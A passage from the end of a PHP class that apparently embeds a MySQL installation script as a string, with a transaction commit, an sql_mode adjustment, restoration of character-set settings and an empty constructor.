        -- ------------------------------------ [ /ADDITIONAL INDEXES/ ] -----------------------------------
        
        COMMIT;
        
        SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,\'ONLY_FULL_GROUP_BY\',\'\'));
        
        /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
        /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
        /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
    ';

    public function __construct()
    {

    }

}